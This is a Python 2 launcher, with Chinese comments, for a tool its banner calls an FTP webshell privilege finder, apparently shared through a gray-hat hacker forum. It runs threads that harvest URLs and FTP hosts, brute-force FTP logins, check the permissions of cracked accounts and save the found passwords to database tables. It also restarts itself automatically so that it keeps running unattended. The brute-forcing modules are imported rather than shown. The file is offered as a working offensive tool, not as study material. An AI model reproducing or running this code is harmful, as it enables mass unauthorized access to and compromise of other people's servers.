#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#FTP采集爆破
import SlinkFTP #FTP爆破
import Sopenftp #采集FTP地址
import Sopenurl #采集URL地址
import Sthread #根据数据量判断线程
import Ssqlite_delete #检测更新数据库
import SpasswordFTP #FTP权限检查

import Cclose_open #结束进程在从新开启进程  解决MYSQL连接错误
import time
import ctypes   #DLL调用
import thread


def Crun():  #启动
    thrint=1
    t_h=Sthread.CS_Cthread()
    Copenurl_nthreads=t_h.openurl()  #采集URL地址
    Copenftp_nthreads=t_h.openftp()  #采集FTP地址
    ClinkFTP_nthreads=t_h.linkftp() #FTP爆破
    print "-"*60
    #time.sleep(10)
    ###########################
    #结束进程在从新开启进程  解决MYSQL连接错误
    Cclose_open_threads = []  #线程
    Cclose_open_nthreads=1
    for i in range(Cclose_open_nthreads):  #nthreads=10  创建10个线程
        Cclose_open_threads.append(Cclose_open.CS_close_open())

    for thread in Cclose_open_threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程
    ###########################
    #检测更新数据库
    t_delete=Ssqlite_delete.CS_mysql_delete()
    t_delete.open_mysql()     #读取URL
    print "-"*60

    Cmysql_delete_threads = []  #线程
    Cmysql_delete_nthreads=1
    for i in range(Cmysql_delete_nthreads):  #nthreads=10  创建10个线程
        Cmysql_delete_threads.append(Ssqlite_delete.CS_mysql_delete())

    for thread in Cmysql_delete_threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程

    ###########################
    #FTP权限检查
    CpasswordFTP_threads = []  #线程
    CpasswordFTP_nthreads=1
    for i in range(CpasswordFTP_nthreads):  #nthreads=10  创建10个线程
        CpasswordFTP_threads.append(SpasswordFTP.CS_passwordFTP())

    for thread in CpasswordFTP_threads:   #不理解这是什么意思    是结束线程吗
        thread.start()  #start就是开始线程
    ###########################
    #采集URL地址
    Copenurl_threads = []  #线程
    for i in range(Copenurl_nthreads):  #nthreads=10  创建10个线程
        Copenurl_threads.append(Sopenurl.CS_openurl(thrint))
        thrint=thrint+1

    for thread in Copenurl_threads:
        time.sleep(1)
        thread.start()  #start就是开始线程
    ###########################
    #采集FTP地址
    Copenftp_threads = []  #线程
    for i in range(Copenftp_nthreads):  #nthreads=10  创建10个线程
        Copenftp_threads.append(Sopenftp.CS_openftp(thrint))
        thrint=thrint+1

    for thread in Copenftp_threads:
        time.sleep(1)
        thread.start()  #start就是开始线程
    ###########################
    #FTP爆破
    ClinkFTP_threads = []  #线程
    for i in range(ClinkFTP_nthreads):  #nthreads=10  创建10个线程
        ClinkFTP_threads.append(SlinkFTP.CS_linkftp(thrint))
        thrint=thrint+1

    for thread in ClinkFTP_threads:
        time.sleep(1)
        thread.start()  #start就是开始线程
    ###########################

    ###########################
    ###########################
    ###########################
    ###########################


##################################################
import sys
import os
import atexit
def close():  #自动重启本程序
    try:
        print u"------------------自动重启本程序------------------"
        time.sleep(10)
        python = sys.executable
        os.execl(python, python, * sys.argv)
        #########
    except:
        print u"------------------自动重启本程序---异常------------------"
        sys.exit(0)  #结束进程

def intet_close():
    dll=ctypes.CDLL("internet_close.dll")
    add=dll.Fun_Internet    #DLL中的函数
    #add.argtypes=[ctypes.c_int,ctypes.c_int]  #参数类型
    add.restypes=ctypes.c_int                 #返回值类型
    INIclose=0
    while 1:
        INIclose=INIclose+1
        if INIclose>=100:  #1.5小时自动重启一次程序
            INIclose=0
            time.sleep(10)
            atexit.register(close)#自动重启本程序
        try:   #检测网络连接状态
            Ainternet=add()
            if str(Ainternet)=="0":
                print u"----网络无连接自动重启程序本身不在线----"
                time.sleep(1)
                atexit.register(close)#自动重启本程序
            else:
                result = {
                    "1" : u"在线：拨号上网",
                    "2" : u"在线：通过局域网",
                    "3" : u"在线：代理",
                    "4" : u"MODEM被其他非INTERNET连接占用",
                    "5" : u"在线：连接方式不明"
                }
                print u"----心跳",INIclose,u"次----",result.get(str(Ainternet)),time.strftime('%Y.%m.%d-%H.%M.%S')

        except:
            print u"--------网络无连接自动重启程序本身--------"
            time.sleep(3)
            atexit.register(close)#自动重启本程序
        time.sleep(20)

def Aintet_close():
    dll=ctypes.CDLL("internet_close.dll")
    add=dll.Fun_Internet    #DLL中的函数
    #add.argtypes=[ctypes.c_int,ctypes.c_int]  #参数类型
    add.restypes=ctypes.c_int                 #返回值类型

    try:   #检测网络连接状态
        Ainternet=add()
        if str(Ainternet)=="0":
            print u"----网络无连接自动重启程序本身不在线----"
            time.sleep(1)
            atexit.register(close)#自动重启本程序
            return 0
        else:
            result = {
                "1" : u"在线：拨号上网",
                "2" : u"在线：通过局域网",
                "3" : u"在线：代理",
                "4" : u"MODEM被其他非INTERNET连接占用",
                "5" : u"在线：连接方式不明"
            }
            print u"----",result.get(str(Ainternet)),time.strftime('%Y.%m.%d-%H.%M.%S')
            return 1
    except:
        print u"--------网络无连接自动重启程序本身--------"
        return 0

if __name__=='__main__':
    print u"---------------------------------------------------------------------"
    print u"      欢迎使用FTP--webshell权限查找器sqlite--0.2-----BY：落雪            "
    print u"      谢谢灰帽程序员论坛对本软件技术支持--http://hmhacker.org/            "
    print u"                落雪网络技术--QQ交流群293663651                         "
    print u"    采集URL地址--采集FTP地址--FTP爆破--FTP权限检查--自动检测更新数据库      "
    print u"  完全解放双手--只需定期查看数据库表--ftppassword3--ftppassword2--就OK了  "
    print u"----------------------------------------------------------------------"
    #time.sleep(10)
    try:
        if Aintet_close():
            print u"在线"
            Crun()  #启动
            thread.start_new_thread(intet_close())#检测网络在线状态
        else:
            print u"不在线---自动重启本程序延时10S"
            time.sleep(5)
            atexit.register(close)#自动重启本程序
    except:
    #    user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
    #    user32.MessageBoxA(0, u'内容', u'标题', 0)   # 调用MessageBoxA函数
        time.sleep(10)
        atexit.register(close)










